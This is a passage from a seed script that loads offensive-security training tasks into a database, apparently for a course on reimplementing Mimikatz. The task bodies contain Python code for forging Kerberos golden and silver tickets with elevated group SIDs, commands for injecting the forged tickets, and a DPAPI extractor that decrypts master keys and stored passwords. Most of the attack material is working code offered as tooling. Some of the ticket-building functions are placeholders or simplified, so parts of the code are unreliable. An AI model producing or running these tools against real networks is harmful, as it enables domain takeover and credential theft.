            info += struct.pack('<II', gid, 7)  # GroupId, Attributes

        # User flags
        info += struct.pack('<I', 0x20)  # EXTRA_SIDS

        # SIDs
        info += self._encode_sid(self.domain_sid)

        return info

    def _build_pac_client_info(self, auth_time: datetime.datetime) -> bytes:
        """Build PAC_CLIENT_INFO"""

        filetime = self._datetime_to_filetime(auth_time)
        name_bytes = self.user.encode('utf-16-le')

        return struct.pack('<QH', filetime, len(name_bytes)) + name_bytes

    def _datetime_to_filetime(self, dt: datetime.datetime) -> int:
        """Convert datetime to Windows FILETIME"""
        epoch = datetime.datetime(1601, 1, 1)
        delta = dt - epoch
        return int(delta.total_seconds() * 10000000)

    def _encode_rpc_unicode(self, s: str) -> bytes:
        """Encode RPC Unicode string"""
        encoded = s.encode('utf-16-le')
        length = len(encoded)
        return struct.pack('<HHI', length, length + 2, 0) + encoded + b'\\x00\\x00'

    def _encode_sid(self, sid_str: str) -> bytes:
        """Encode SID string to binary"""
        parts = sid_str.split('-')
        revision = int(parts[1])
        authority = int(parts[2])
        sub_auths = [int(x) for x in parts[3:]]

        sid = struct.pack('BB', revision, len(sub_auths))
        sid += struct.pack('>Q', authority)[2:]  # 6 bytes big-endian
        for sa in sub_auths:
            sid += struct.pack('<I', sa)

        return sid

    def _build_enc_ticket_part(self, auth_time, start_time, end_time,
                                renew_till, pac) -> bytes:
        """Build EncTicketPart ASN.1 structure"""
        # Simplified - would use pyasn1 for proper encoding
        return pac  # Placeholder

    def _build_ticket(self, encrypted_data: bytes) -> bytes:
        """Build Ticket ASN.1 structure"""
        return encrypted_data  # Placeholder

    def _build_enc_kdc_rep(self, session_key, start_time,
                           end_time, renew_till) -> bytes:
        """Build EncKDCRepPart"""
        return session_key  # Placeholder

    def _build_as_rep(self, ticket: bytes, enc_kdc_rep: bytes) -> bytes:
        """Build AS-REP message"""
        return ticket + enc_kdc_rep  # Placeholder

    def save_kirbi(self, path: str):
        """Save ticket in Kirbi format"""
        ticket_data = self.generate()
        with open(path, 'wb') as f:
            f.write(ticket_data)
        print(f"[+] Golden ticket saved to {path}")

    def save_ccache(self, path: str):
        """Save ticket in ccache format (Linux)"""
        ticket_data = self.generate()
        # Convert to ccache format
        # ...
        print(f"[+] Golden ticket saved to {path}")


def main():
    import argparse

    parser = argparse.ArgumentParser(description='Golden Ticket Generator')
    parser.add_argument('--domain', required=True, help='Domain name')
    parser.add_argument('--sid', required=True, help='Domain SID')
    parser.add_argument('--krbtgt', required=True, help='KRBTGT NT hash or AES key')
    parser.add_argument('--user', required=True, help='Username to impersonate')
    parser.add_argument('--id', type=int, default=500, help='User ID (default: 500)')
    parser.add_argument('--groups', help='Comma-separated group IDs')
    parser.add_argument('--output', '-o', required=True, help='Output file')

    args = parser.parse_args()

    # Parse KRBTGT key
    krbtgt_bytes = bytes.fromhex(args.krbtgt)
    if len(krbtgt_bytes) == 16:
        key = EncryptionKey.from_nt_hash(krbtgt_bytes)
    else:
        key = EncryptionKey.from_aes_key(krbtgt_bytes)

    # Parse groups
    groups = None
    if args.groups:
        groups = [int(g) for g in args.groups.split(',')]

    # Generate ticket
    golden = GoldenTicket(
        domain=args.domain,
        domain_sid=args.sid,
        krbtgt_key=key,
        user=args.user,
        user_id=args.id,
        groups=groups
    )

    if args.output.endswith('.kirbi'):
        golden.save_kirbi(args.output)
    else:
        golden.save_ccache(args.output)


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Generate golden ticket
python golden_ticket.py \\
    --domain CORP.LOCAL \\
    --sid S-1-5-21-1234567890-1234567890-1234567890 \\
    --krbtgt aad3b435b51404eeaad3b435b51404ee \\
    --user Administrator \\
    --output admin.kirbi

# Inject ticket (Linux)
export KRB5CCNAME=/tmp/admin.ccache
klist

# Inject ticket (Windows with Rubeus)
Rubeus.exe ptt /ticket:admin.kirbi
\`\`\`
`, 0, now);

insertTask.run(mimMod2.lastInsertRowid, 'Build Silver Ticket Generator', 'Create forged Kerberos service tickets (TGS) using a service account NTLM hash or AES key, bypassing the KDC entirely to gain targeted access to specific services like CIFS, MSSQL, HTTP, or LDAP without domain controller interaction', `## Silver Ticket Generator

### Overview
Forge Kerberos service tickets using the service account's hash for targeted access.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
Silver Ticket Generator
Forge service tickets using service account hash
"""

import struct
import datetime
import os
from dataclasses import dataclass
from typing import Optional, List
from Crypto.Cipher import AES, ARC4
from Crypto.Hash import HMAC, MD5
import hashlib


@dataclass
class ServiceTicket:
    """Service ticket configuration"""
    domain: str
    domain_sid: str
    service_key: bytes  # NT hash or AES key
    key_type: int       # 23 = RC4, 18 = AES256
    service: str        # Service SPN (e.g., cifs/server.domain.com)
    target: str         # Target server
    user: str           # Username to impersonate
    user_id: int = 500
    groups: List[int] = None


class SilverTicket:
    """Generate Silver Ticket (forged service ticket)"""

    ETYPE_AES256 = 18
    ETYPE_RC4 = 23

    def __init__(self, config: ServiceTicket):
        self.config = config
        if config.groups is None:
            self.config.groups = [512, 513, 518, 519, 520]

    def generate(self) -> bytes:
        """Generate the forged service ticket"""

        now = datetime.datetime.utcnow()
        start_time = now
        end_time = now + datetime.timedelta(hours=10*365*24)  # 10 years

        # Build PAC with elevated privileges
        pac = self._build_pac(now)

        # Build EncTicketPart
        session_key = os.urandom(16)  # Random session key
        enc_part = self._build_enc_ticket_part(
            session_key, pac, start_time, end_time
        )

        # Encrypt with service key
        if self.config.key_type == self.ETYPE_RC4:
            encrypted = self._encrypt_rc4(enc_part, 2)  # Usage 2 for ticket
        else:
            encrypted = self._encrypt_aes256(enc_part, 2)

        # Build complete ticket
        ticket = self._build_ticket(encrypted)

        return ticket

    def _build_pac(self, auth_time: datetime.datetime) -> bytes:
        """Build PAC with custom privileges"""

        # KERB_VALIDATION_INFO (NDR encoded)
        validation_info = self._build_validation_info(auth_time)

        # PAC_CLIENT_INFO
        client_info = self._build_client_info(auth_time)

        # Checksums (will be computed)
        server_checksum = self._compute_checksum(validation_info, 'server')
        kdc_checksum = self._compute_checksum(validation_info, 'kdc')

        # Assemble PAC
        buffers = [
            (0x00000001, validation_info),
            (0x0000000A, client_info),
            (0x00000006, server_checksum),
            (0x00000007, kdc_checksum),
        ]

        return self._pack_pac(buffers)

    def _build_validation_info(self, auth_time: datetime.datetime) -> bytes:
        """Build KERB_VALIDATION_INFO"""

        filetime = self._to_filetime(auth_time)

        # Build NDR-encoded structure
        data = bytearray()

        # Timestamps
        data += struct.pack('<Q', filetime)  # LogonTime
        data += struct.pack('<Q', 0)          # LogoffTime
        data += struct.pack('<Q', 0x7FFFFFFFFFFFFFFF)  # KickOffTime
        data += struct.pack('<Q', filetime)   # PasswordLastSet
        data += struct.pack('<Q', 0)          # PasswordCanChange
        data += struct.pack('<Q', 0x7FFFFFFFFFFFFFFF)  # PasswordMustChange

        # Strings (RPC_UNICODE_STRING)
        data += self._ndr_string(self.config.user)      # EffectiveName
        data += self._ndr_string(self.config.user)      # FullName
        data += self._ndr_string('')                     # LogonScript
        data += self._ndr_string('')                     # ProfilePath
        data += self._ndr_string('')                     # HomeDirectory
        data += self._ndr_string('')                     # HomeDirectoryDrive

        # Counts
        data += struct.pack('<HH', 0, 0)  # LogonCount, BadPasswordCount

        # IDs
        data += struct.pack('<I', self.config.user_id)  # UserId
        data += struct.pack('<I', 513)                   # PrimaryGroupId

        # Groups
        data += struct.pack('<I', len(self.config.groups))  # GroupCount
        for gid in self.config.groups:
            data += struct.pack('<II', gid, 0x00000007)  # SE_GROUP_*

        # Flags
        data += struct.pack('<I', 0x00000020)  # UserFlags (EXTRA_SIDS)

        # Session key (zeros)
        data += bytes(16)

        # LogonServer and LogonDomainName
        data += self._ndr_string('DC01')
        data += self._ndr_string(self.config.domain)

        # LogonDomainId (SID)
        data += self._encode_sid(self.config.domain_sid)

        # Reserved
        data += bytes(8)

        # UserAccountControl
        data += struct.pack('<I', 0x00000010)  # NORMAL_ACCOUNT

        # SubAuthStatus, LastSuccessfulILogon, etc
        data += bytes(28)

        # ExtraSids (add Domain Admins, Enterprise Admins, etc)
        extra_sids = [
            f"{self.config.domain_sid}-519",  # Enterprise Admins
            "S-1-5-18",                        # SYSTEM
        ]
        data += struct.pack('<I', len(extra_sids))
        for sid in extra_sids:
            data += self._encode_sid(sid)
            data += struct.pack('<I', 0x00000007)

        return bytes(data)

    def _build_client_info(self, auth_time: datetime.datetime) -> bytes:
        """Build PAC_CLIENT_INFO"""
        filetime = self._to_filetime(auth_time)
        name = self.config.user.encode('utf-16-le')
        return struct.pack('<QH', filetime, len(name)) + name

    def _compute_checksum(self, data: bytes, checksum_type: str) -> bytes:
        """Compute PAC checksum"""

        if self.config.key_type == self.ETYPE_RC4:
            # HMAC-MD5
            if checksum_type == 'server':
                key = HMAC.new(self.config.service_key, b'signaturekey\\x00', MD5).digest()
            else:
                key = self.config.service_key
            return HMAC.new(key, data, MD5).digest()
        else:
            # HMAC-SHA1
            return hashlib.sha1(data).digest()[:12]

    def _pack_pac(self, buffers: list) -> bytes:
        """Pack PAC structure"""

        # Header
        header_size = 8 + len(buffers) * 16
        offset = header_size

        pac = struct.pack('<II', len(buffers), 0)  # cBuffers, Version

        for buf_type, buf_data in buffers:
            aligned_size = (len(buf_data) + 7) & ~7
            pac += struct.pack('<IIQQ', buf_type, len(buf_data), offset, 0)
            offset += aligned_size

        for _, buf_data in buffers:
            aligned_size = (len(buf_data) + 7) & ~7
            pac += buf_data + bytes(aligned_size - len(buf_data))

        return pac

    def _build_enc_ticket_part(self, session_key: bytes, pac: bytes,
                                start_time, end_time) -> bytes:
        """Build EncTicketPart ASN.1"""

        # This would use pyasn1 for proper encoding
        # Simplified structure
        enc_part = bytearray()

        # Flags
        enc_part += struct.pack('>I', 0x40a10000)

        # Session key
        enc_part += session_key

        # CRealm
        enc_part += self.config.domain.upper().encode()

        # CName
        enc_part += self.config.user.encode()

        # AuthorizationData (PAC)
        enc_part += struct.pack('>H', 128)  # AD-WIN2K-PAC
        enc_part += struct.pack('>I', len(pac))
        enc_part += pac

        return bytes(enc_part)

    def _build_ticket(self, encrypted: bytes) -> bytes:
        """Build complete Ticket structure"""

        # ASN.1 Ticket structure
        ticket = bytearray()

        # tkt-vno (5)
        ticket += b'\\xa0\\x03\\x02\\x01\\x05'

        # realm
        realm = self.config.domain.upper().encode()
        ticket += b'\\xa1' + bytes([len(realm) + 2])
        ticket += b'\\x1b' + bytes([len(realm)])
        ticket += realm

        # sname
        sname = self.config.service.encode()
        ticket += b'\\xa2' + bytes([len(sname) + 4])
        ticket += b'\\x30' + bytes([len(sname) + 2])
        ticket += b'\\x1b' + bytes([len(sname)])
        ticket += sname

        # enc-part
        ticket += b'\\xa3' + bytes([len(encrypted) + 4])
        ticket += b'\\x30' + bytes([len(encrypted) + 2])
        ticket += bytes([self.config.key_type])
        ticket += encrypted

        # Wrap in APPLICATION 1
        return b'\\x61' + bytes([len(ticket)]) + bytes(ticket)

    def _encrypt_rc4(self, plaintext: bytes, usage: int) -> bytes:
        """RC4-HMAC encryption"""

        k1 = HMAC.new(self.config.service_key,
                      struct.pack('<I', usage), MD5).digest()

        confounder = os.urandom(8)
        checksum = HMAC.new(k1, confounder + plaintext, MD5).digest()

        k2 = HMAC.new(k1, checksum, MD5).digest()
        cipher = ARC4.new(k2)

        return checksum + cipher.encrypt(confounder + plaintext)

    def _encrypt_aes256(self, plaintext: bytes, usage: int) -> bytes:
        """AES-256-CTS encryption"""

        # Derive keys
        key = self.config.service_key

        # Confounder
        conf = os.urandom(16)

        # Pad
        data = conf + plaintext
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len] * pad_len)

        # Encrypt
        cipher = AES.new(key, AES.MODE_CBC, bytes(16))
        ct = cipher.encrypt(data)

        # HMAC
        mac = HMAC.new(key, ct, hashlib.sha1).digest()[:12]

        return ct + mac

    def _to_filetime(self, dt: datetime.datetime) -> int:
        epoch = datetime.datetime(1601, 1, 1)
        return int((dt - epoch).total_seconds() * 10000000)

    def _ndr_string(self, s: str) -> bytes:
        encoded = s.encode('utf-16-le')
        return struct.pack('<HHI', len(encoded), len(encoded)+2, 0) + encoded + b'\\x00\\x00'

    def _encode_sid(self, sid_str: str) -> bytes:
        parts = sid_str.split('-')
        revision = int(parts[1])
        authority = int(parts[2])
        sub_auths = [int(x) for x in parts[3:]]

        sid = struct.pack('BB', revision, len(sub_auths))
        sid += struct.pack('>Q', authority)[2:]
        for sa in sub_auths:
            sid += struct.pack('<I', sa)
        return sid

    def save(self, path: str):
        """Save ticket to file"""
        ticket = self.generate()

        if path.endswith('.kirbi'):
            # Kirbi format
            with open(path, 'wb') as f:
                f.write(ticket)
        else:
            # ccache format
            ccache = self._to_ccache(ticket)
            with open(path, 'wb') as f:
                f.write(ccache)

        print(f"[+] Silver ticket saved: {path}")

    def _to_ccache(self, ticket: bytes) -> bytes:
        """Convert to ccache format"""
        # Simplified ccache generation
        return ticket


def main():
    import argparse

    parser = argparse.ArgumentParser(description='Silver Ticket Generator')
    parser.add_argument('--domain', '-d', required=True)
    parser.add_argument('--sid', required=True, help='Domain SID')
    parser.add_argument('--service', '-s', required=True, help='Service SPN')
    parser.add_argument('--target', '-t', required=True, help='Target server')
    parser.add_argument('--key', '-k', required=True, help='Service key (NT hash)')
    parser.add_argument('--user', '-u', required=True, help='User to impersonate')
    parser.add_argument('--output', '-o', required=True)

    args = parser.parse_args()

    config = ServiceTicket(
        domain=args.domain,
        domain_sid=args.sid,
        service_key=bytes.fromhex(args.key),
        key_type=23,  # RC4
        service=args.service,
        target=args.target,
        user=args.user
    )

    silver = SilverTicket(config)
    silver.save(args.output)


if __name__ == '__main__':
    main()
\`\`\`

### Common Silver Ticket Targets
- **CIFS** - File share access
- **HTTP** - Web services, WinRM
- **LDAP** - Directory queries
- **HOST** - PsExec, scheduled tasks
- **MSSQL** - Database access
`, 1, now);

// Module 3: DPAPI Secrets
const mimMod3 = insertModule.run(mimikatzPath.lastInsertRowid, 'DPAPI Secrets Extraction', 'Extract DPAPI-protected secrets', 2, now);

insertTask.run(mimMod3.lastInsertRowid, 'Build DPAPI Master Key Extractor', 'Locate and decrypt Windows Data Protection API master keys from user profiles and domain backup keys, enabling decryption of browser passwords, WiFi credentials, and other DPAPI-protected secrets', `## DPAPI Master Key Extraction

### Overview
Extract DPAPI master keys for offline credential decryption.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
DPAPI Master Key Extractor
Extract and decrypt DPAPI master keys
"""

import os
import struct
from pathlib import Path
from Crypto.Cipher import AES, DES3
from Crypto.Hash import HMAC, SHA1, MD4
from dataclasses import dataclass
from typing import Optional, Dict, List


@dataclass
class MasterKey:
    """DPAPI Master Key"""
    guid: str
    key: bytes
    domain_key: Optional[bytes] = None


@dataclass
class CredentialBlob:
    """DPAPI Credential structure"""
    version: int
    guid: str
    description: str
    last_written: int
    data: bytes


class DPAPIExtractor:
    """Extract DPAPI secrets"""

    def __init__(self):
        self.master_keys: Dict[str, MasterKey] = {}

    def get_user_masterkeys_path(self, username: str = None) -> Path:
        """Get path to user's master keys"""
        if username:
            return Path(f"C:/Users/{username}/AppData/Roaming/Microsoft/Protect")
        return Path.home() / "AppData/Roaming/Microsoft/Protect"

    def get_system_masterkeys_path(self) -> Path:
        """Get path to SYSTEM master keys"""
        return Path("C:/Windows/System32/Microsoft/Protect/S-1-5-18")

    def parse_masterkey_file(self, path: Path) -> Optional[dict]:
        """Parse a master key file"""

        with open(path, 'rb') as f:
            data = f.read()

        if len(data) < 0x80:
            return None

        # Master Key File Header
        version = struct.unpack('<I', data[0:4])[0]
        guid = data[12:28]

        # Flags
        flags = struct.unpack('<I', data[28:32])[0]

        # Master Key
        mk_offset = 0x80
        mk_len = struct.unpack('<I', data[mk_offset:mk_offset+4])[0]

        master_key_blob = data[mk_offset:mk_offset+mk_len]

        return {
            'version': version,
            'guid': self._format_guid(guid),
            'flags': flags,
            'master_key_blob': master_key_blob,
        }

    def decrypt_masterkey_with_password(
        self,
        mk_blob: bytes,
        password: str,
        sid: str
    ) -> Optional[bytes]:
        """Decrypt master key with user password"""

        # Derive key from password and SID
        # PBKDF2 with SHA1
        password_hash = self._ntlm_hash(password)

        # Derive DPAPI key
        derived_key = self._derive_key(password_hash, sid)

        # Decrypt master key
        return self._decrypt_blob(mk_blob, derived_key)

    def decrypt_masterkey_with_hash(
        self,
        mk_blob: bytes,
        nt_hash: bytes,
        sid: str
    ) -> Optional[bytes]:
        """Decrypt master key with NT hash"""

        # SHA1(nt_hash)
        sha1_hash = SHA1.new(nt_hash).digest()

        # Derive key
        derived_key = self._derive_key(sha1_hash, sid)

        # Decrypt
        return self._decrypt_blob(mk_blob, derived_key)

    def decrypt_masterkey_with_domain_backup(
        self,
        mk_blob: bytes,
        domain_backup_key: bytes
    ) -> Optional[bytes]:
        """Decrypt master key with domain backup key"""

        # Domain backup key can decrypt any user's master key
        # This is the "skeleton key" for DPAPI

        # Extract domain key blob from master key file
        # Decrypt with RSA private key (domain backup key)

        return self._decrypt_with_rsa(mk_blob, domain_backup_key)

    def _derive_key(self, password_hash: bytes, sid: str) -> bytes:
        """Derive DPAPI decryption key"""

        # Convert SID to bytes
        sid_bytes = sid.encode('utf-16-le')

        # HMAC-SHA1
        hmac = HMAC.new(password_hash, sid_bytes, SHA1)

        return hmac.digest()

    def _decrypt_blob(self, blob: bytes, key: bytes) -> Optional[bytes]:
        """Decrypt DPAPI blob"""

        if len(blob) < 36:
            return None

        # Parse blob header
        version = struct.unpack('<I', blob[0:4])[0]
        crypt_alg = struct.unpack('<I', blob[20:24])[0]
        hash_alg = struct.unpack('<I', blob[24:28])[0]

        # Get cipher
        if crypt_alg == 0x6603:  # 3DES
            cipher_func = DES3
            key_len = 24
        elif crypt_alg == 0x6610:  # AES-256
            cipher_func = AES
            key_len = 32
        else:
            return None

        # Derive actual key
        hmac = HMAC.new(key, blob[36:68], SHA1)
        derived = hmac.digest()

        # Expand key if needed
        if len(derived) < key_len:
            hmac2 = HMAC.new(key, derived, SHA1)
            derived += hmac2.digest()

        crypt_key = derived[:key_len]

        # Get encrypted data
        enc_data = blob[68:]

        # Decrypt
        if crypt_alg == 0x6603:
            cipher = DES3.new(crypt_key, DES3.MODE_CBC, bytes(8))
        else:
            cipher = AES.new(crypt_key, AES.MODE_CBC, bytes(16))

        return cipher.decrypt(enc_data)

    def _ntlm_hash(self, password: str) -> bytes:
        """Calculate NT hash"""
        return MD4.new(password.encode('utf-16-le')).digest()

    def _format_guid(self, guid_bytes: bytes) -> str:
        """Format GUID bytes as string"""
        parts = struct.unpack('<IHH', guid_bytes[:8])
        rest = guid_bytes[8:16].hex()
        return f"{parts[0]:08x}-{parts[1]:04x}-{parts[2]:04x}-{rest[:4]}-{rest[4:]}"

    def _decrypt_with_rsa(self, blob: bytes, key: bytes) -> Optional[bytes]:
        """Decrypt with RSA domain backup key"""
        from Crypto.PublicKey import RSA
        from Crypto.Cipher import PKCS1_OAEP

        try:
            rsa_key = RSA.import_key(key)
            cipher = PKCS1_OAEP.new(rsa_key)
            return cipher.decrypt(blob)
        except:
            return None

    def extract_credentials(self, path: Path) -> List[CredentialBlob]:
        """Extract credentials from Credentials folder"""

        creds = []
        cred_path = path / "Credentials"

        if not cred_path.exists():
            return creds

        for cred_file in cred_path.iterdir():
            try:
                with open(cred_file, 'rb') as f:
                    data = f.read()

                # Parse DPAPI blob
                version = struct.unpack('<I', data[0:4])[0]
                guid = self._format_guid(data[24:40])

                creds.append(CredentialBlob(
                    version=version,
                    guid=guid,
                    description="",
                    last_written=0,
                    data=data
                ))
            except:
                continue

        return creds

    def decrypt_credential(self, cred: CredentialBlob) -> Optional[dict]:
        """Decrypt a credential blob"""

        # Find matching master key
        if cred.guid not in self.master_keys:
            return None

        mk = self.master_keys[cred.guid]

        # Decrypt
        decrypted = self._decrypt_blob(cred.data, mk.key)

        if not decrypted:
            return None

        # Parse credential structure
        return self._parse_credential(decrypted)

    def _parse_credential(self, data: bytes) -> dict:
        """Parse decrypted credential structure"""

        # CREDENTIAL structure
        flags = struct.unpack('<I', data[0:4])[0]
        cred_type = struct.unpack('<I', data[4:8])[0]

        # Target name (UNICODE string)
        target_len = struct.unpack('<I', data[16:20])[0]
        target = data[24:24+target_len].decode('utf-16-le', errors='ignore')

        # Username
        username_offset = 24 + target_len
        username_len = struct.unpack('<I', data[username_offset:username_offset+4])[0]
        username = data[username_offset+8:username_offset+8+username_len].decode('utf-16-le', errors='ignore')

        # Password
        pw_offset = username_offset + 8 + username_len
        pw_len = struct.unpack('<I', data[pw_offset:pw_offset+4])[0]
        password = data[pw_offset+8:pw_offset+8+pw_len].decode('utf-16-le', errors='ignore')

        return {
            'target': target,
            'username': username,
            'password': password,
            'type': cred_type
        }


def main():
    import argparse

    parser = argparse.ArgumentParser(description='DPAPI Extractor')
    parser.add_argument('--masterkey', '-m', help='Master key file')
    parser.add_argument('--password', '-p', help='User password')
    parser.add_argument('--hash', help='NT hash')
    parser.add_argument('--sid', '-s', help='User SID')
    parser.add_argument('--credential', '-c', help='Credential file')
    parser.add_argument('--domain-key', '-d', help='Domain backup key')

    args = parser.parse_args()

    extractor = DPAPIExtractor()

    if args.masterkey and args.sid:
        mk_data = extractor.parse_masterkey_file(Path(args.masterkey))

        if args.password:
            key = extractor.decrypt_masterkey_with_password(
                mk_data['master_key_blob'],
                args.password,
                args.sid
            )
        elif args.hash:
            key = extractor.decrypt_masterkey_with_hash(
                mk_data['master_key_blob'],
                bytes.fromhex(args.hash),
                args.sid
            )

        if key:
            print(f"[+] Decrypted master key: {key.hex()}")
            extractor.master_keys[mk_data['guid']] = MasterKey(
                guid=mk_data['guid'],
                key=key
            )


if __name__ == '__main__':
    main()
\`\`\`

### Targets
- Chrome passwords (Local State + Login Data)
- Browser cookies
- Windows Credential Manager
- Wi-Fi passwords
- RDP credentials
- Outlook passwords
`, 0, now);

console.log('Seeded: Mimikatz Reimplementation');
console.log('  - LSASS dumper');
console.log('  - LSASS memory parser');
console.log('  - sekurlsa module');
console.log('  - Golden/Silver ticket generators');
console.log('  - DPAPI extraction');
